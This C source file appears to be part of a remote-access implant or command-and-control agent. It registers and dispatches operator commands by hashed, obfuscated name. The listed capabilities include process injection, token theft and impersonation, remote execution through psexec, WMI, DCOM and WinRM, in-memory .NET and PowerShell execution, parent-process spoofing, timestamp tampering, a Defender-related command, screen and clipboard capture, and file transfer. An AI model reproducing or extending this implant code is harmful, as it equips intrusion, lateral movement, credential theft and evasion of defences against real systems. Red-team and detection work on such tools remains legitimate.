#include "config.h"
#include "commands.h"
#include "common.h"

#define MAX_COMMANDS 96

static COMMAND_ENTRY g_commands[MAX_COMMANDS];
static DWORD g_command_count = 0;

static VOID _register(const char* name, COMMAND_HANDLER handler) {
    if (g_command_count >= MAX_COMMANDS) return;
    g_commands[g_command_count].hash    = hash_string_djb2(name);
    g_commands[g_command_count].handler = handler;
    g_command_count++;
}

VOID register_commands(PINSTANCE inst) {
    g_command_count = 0;

#ifdef INCLUDE_CMD_SHELL
    _register(XSTR("shell"), cmd_shell);
#endif
#ifdef INCLUDE_CMD_LS
    _register(XSTR("ls"), cmd_ls);
#endif
#ifdef INCLUDE_CMD_CD
    _register(XSTR("cd"), cmd_cd);
#endif
#ifdef INCLUDE_CMD_PWD
    _register(XSTR("pwd"), cmd_pwd);
#endif
#ifdef INCLUDE_CMD_CAT
    _register(XSTR("cat"), cmd_cat);
#endif
#ifdef INCLUDE_CMD_UPLOAD
    _register(XSTR("upload"), cmd_upload);
#endif
#ifdef INCLUDE_CMD_DOWNLOAD
    _register(XSTR("download"), cmd_download);
#endif
#ifdef INCLUDE_CMD_EXIT
    _register(XSTR("exit"), cmd_exit);
#endif
#ifdef INCLUDE_CMD_SLEEP
    _register(XSTR("sleep"), cmd_sleep);
#endif
#ifdef INCLUDE_CMD_WHOAMI
    _register(XSTR("whoami"), cmd_whoami);
#endif
#ifdef INCLUDE_CMD_GETUID
    _register(XSTR("getuid"), cmd_getuid);
#endif
#ifdef INCLUDE_CMD_PS
    _register(XSTR("ps"), cmd_ps);
#endif
#ifdef INCLUDE_CMD_KILL
    _register(XSTR("kill"), cmd_kill);
#endif
#ifdef INCLUDE_CMD_CP
    _register(XSTR("cp"), cmd_cp);
#endif
#ifdef INCLUDE_CMD_MV
    _register(XSTR("mv"), cmd_mv);
#endif
#ifdef INCLUDE_CMD_RM
    _register(XSTR("rm"), cmd_rm);
#endif
#ifdef INCLUDE_CMD_MKDIR
    _register(XSTR("mkdir"), cmd_mkdir);
#endif
#ifdef INCLUDE_CMD_INLINE_EXECUTE
    _register(XSTR("inline_execute"), cmd_inline_execute);
#endif
#ifdef INCLUDE_CMD_INJECT
    _register(XSTR("inject"), cmd_inject);
#endif
#ifdef INCLUDE_CMD_CONFIG
    _register(XSTR("config"), cmd_config);
#endif
#ifdef INCLUDE_CMD_SPAWNTO_X64
    _register(XSTR("spawnto_x64"), cmd_spawnto_x64);
#endif
#ifdef INCLUDE_CMD_SPAWNTO_X86
    _register(XSTR("spawnto_x86"), cmd_spawnto_x86);
#endif
#ifdef INCLUDE_CMD_SPAWN
    _register(XSTR("spawn"), cmd_spawn);
#endif
#ifdef INCLUDE_CMD_ARGUE
    _register(XSTR("argue"), cmd_argue);
#endif
#ifdef INCLUDE_CMD_EXECUTE_ASSEMBLY
    _register(XSTR("execute_assembly"), cmd_execute_assembly);
#endif
#ifdef INCLUDE_CMD_POWERPICK
    _register(XSTR("powerpick"), cmd_powerpick);
#endif
#ifdef INCLUDE_CMD_SCREENSHOT
    _register(XSTR("screenshot"), cmd_screenshot);
#endif
#ifdef INCLUDE_CMD_RUN
    _register(XSTR("run"), cmd_run);
#endif
#ifdef INCLUDE_CMD_EXECUTE
    _register(XSTR("execute"), cmd_execute);
#endif
#ifdef INCLUDE_CMD_MAKE_TOKEN
    _register(XSTR("make_token"), cmd_make_token);
#endif
#ifdef INCLUDE_CMD_STEAL_TOKEN
    _register(XSTR("steal_token"), cmd_steal_token);
#endif
#ifdef INCLUDE_CMD_REV2SELF
    _register(XSTR("rev2self"), cmd_rev2self);
#endif
#ifdef INCLUDE_CMD_GETPRIVS
    _register(XSTR("getprivs"), cmd_getprivs);
#endif
#ifdef INCLUDE_CMD_PPID
    _register(XSTR("ppid"), cmd_ppid);
#endif
#ifdef INCLUDE_CMD_BLOCKDLLS
    _register(XSTR("blockdlls"), cmd_blockdlls);
#endif
#ifdef INCLUDE_CMD_LINK
    _register(XSTR("link"), cmd_link);
#endif
#ifdef INCLUDE_CMD_UNLINK
    _register(XSTR("unlink"), cmd_unlink);
#endif
#ifdef INCLUDE_CMD_PSEXEC
    _register(XSTR("psexec"), cmd_psexec);
#endif
#ifdef INCLUDE_CMD_PSEXEC_PSH
    _register(XSTR("psexec_psh"), cmd_psexec_psh);
#endif
#ifdef INCLUDE_CMD_WMIEXEC
    _register(XSTR("wmiexec"), cmd_wmiexec);
#endif
#ifdef INCLUDE_CMD_ENV
    _register(XSTR("env"), cmd_env);
#endif
#ifdef INCLUDE_CMD_DRIVERS
    _register(XSTR("drivers"), cmd_drivers);
#endif
#ifdef INCLUDE_CMD_TASKS
    _register(XSTR("tasks"), cmd_tasks);
#endif
#ifdef INCLUDE_CMD_SERVICES
    _register(XSTR("services"), cmd_services);
#endif
#ifdef INCLUDE_CMD_SOFTWARE
    _register(XSTR("software"), cmd_software);
#endif
#ifdef INCLUDE_CMD_NETSTAT
    _register(XSTR("netstat"), cmd_netstat);
#endif
#ifdef INCLUDE_CMD_ARP
    _register(XSTR("arp"), cmd_arp);
#endif
#ifdef INCLUDE_CMD_ROUTE
    _register(XSTR("route"), cmd_route);
#endif
#ifdef INCLUDE_CMD_LOCALGROUP
    _register(XSTR("localgroup"), cmd_localgroup);
#endif
#ifdef INCLUDE_CMD_SHARE
    _register(XSTR("share"), cmd_share);
#endif
#ifdef INCLUDE_CMD_DOMAININFO
    _register(XSTR("domaininfo"), cmd_domaininfo);
#endif
#ifdef INCLUDE_CMD_UAC
    _register(XSTR("uac"), cmd_uac);
#endif
#ifdef INCLUDE_CMD_DEFENDER
    _register(XSTR("defender"), cmd_defender);
#endif
#ifdef INCLUDE_CMD_WINDOWLIST
    _register(XSTR("windowlist"), cmd_windowlist);
#endif
#ifdef INCLUDE_CMD_UPTIME
    _register(XSTR("uptime"), cmd_uptime);
#endif
#ifdef INCLUDE_CMD_QUSER
    _register(XSTR("quser"), cmd_quser);
#endif
#ifdef INCLUDE_CMD_FIND
    _register(XSTR("find"), cmd_find);
#endif
#ifdef INCLUDE_CMD_GREP
    _register(XSTR("grep"), cmd_grep);
#endif
#ifdef INCLUDE_CMD_TREE
    _register(XSTR("tree"), cmd_tree);
#endif
#ifdef INCLUDE_CMD_STAT
    _register(XSTR("stat"), cmd_stat);
#endif
#ifdef INCLUDE_CMD_TIMESTOMP
    _register(XSTR("timestomp"), cmd_timestomp);
#endif
#ifdef INCLUDE_CMD_WGET
    _register(XSTR("wget"), cmd_wget);
#endif
#ifdef INCLUDE_CMD_PSGREP
    _register(XSTR("psgrep"), cmd_psgrep);
#endif
#ifdef INCLUDE_CMD_PROCINFO
    _register(XSTR("procinfo"), cmd_procinfo);
#endif
#ifdef INCLUDE_CMD_CLIPBOARD
    _register(XSTR("clipboard"), cmd_clipboard);
#endif
#ifdef INCLUDE_CMD_PING
    _register(XSTR("ping"), cmd_ping);
#endif
#ifdef INCLUDE_CMD_DNS
    _register(XSTR("dns"), cmd_dns);
#endif
#ifdef INCLUDE_CMD_PORTSCAN
    _register(XSTR("portscan"), cmd_portscan);
#endif
#ifdef INCLUDE_CMD_CURL
    _register(XSTR("curl"), cmd_curl);
#endif
#ifdef INCLUDE_CMD_SPOOF_TEST
    _register(XSTR("spooftest"), cmd_spooftest);
#endif
#ifdef INCLUDE_CMD_DCOMEXEC
    _register(XSTR("dcomexec"), cmd_dcomexec);
#endif
#ifdef INCLUDE_CMD_WINRM
    _register(XSTR("winrm"), cmd_winrm);
#endif
}

VOID dispatch_command(PINSTANCE inst, const char* cmd_name, BYTE* args, DWORD args_len,
                      BYTE** out_data, DWORD* out_len, BOOL* out_error) {
    DWORD cmd_hash = hash_string_djb2(cmd_name);

    for (DWORD i = 0; i < g_command_count; i++) {
        if (g_commands[i].hash == cmd_hash) {
            PARSER p;
            parser_init(&p, args, args_len);

            PPACKAGE pkg = package_create(inst);
            if (!pkg) return;

            g_commands[i].handler(inst, &p, pkg);

            if (out_error) *out_error = pkg->is_error;
            if (out_data && out_len && pkg->length > 0) {
                *out_data = (BYTE*)es_malloc(inst, pkg->length);
                if (*out_data) {
                    es_memcpy(*out_data, pkg->buffer, pkg->length);
                    *out_len = pkg->length;
                }
            } else if (out_data) {
                *out_data = NULL;
            }

            package_destroy(inst, pkg);
            return;
        }
    }

    if (out_error) *out_error = TRUE;
    if (out_data) *out_data = NULL;
    if (out_len) *out_len = 0;
}
